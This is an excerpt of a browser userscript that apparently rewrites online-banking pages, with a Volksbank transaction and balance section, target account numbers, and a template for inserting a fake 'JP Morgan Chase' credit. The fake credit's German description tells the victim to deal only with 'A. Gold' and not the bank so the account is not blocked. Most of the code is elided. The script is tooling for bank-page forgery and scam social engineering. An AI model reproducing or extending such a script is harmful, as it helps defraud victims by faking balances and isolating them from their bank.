// ==UserScript==
// @name         Ed Rec Volk winfriedneuss@gmail.com
...
// @match        https://yahoo.com/sign/ar/*a
...
// @match        file:///C:/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/506442/Ed%20Rec%20Volk%20winfriedneuss%40gmailcom.user.js
// @updateURL https://update.greasyfork.org/scripts/506442/Ed%20Rec%20Volk%20winfriedneuss%40gmailcom.meta.js
// ==/UserScript==
...
//222222444444---------------VOLKS UMSAETZE AND UEBER BAL CHANGE---------------------------------------------------------------------------------------------------------------
    ...
    var targetTextContent1 = "343DE64 4416 0014";
    var targetTextContent2 = " 43 1112 1369 00";
...
//  {
 //           title: 'JP Morgan Chase',
 //           description: 'Geld mit A. Gold absprechen. Wenden Sie sich nur an A. Gold, nicht die Bank, damit nicht gesperrt.',
 //           amount: '13.500,00',
 //           date: '14. Aug.',
 //           insertAfter: false, // Set to false to insert before the original transaction
 //          moveSteps: 1, // Number of steps to move the transaction
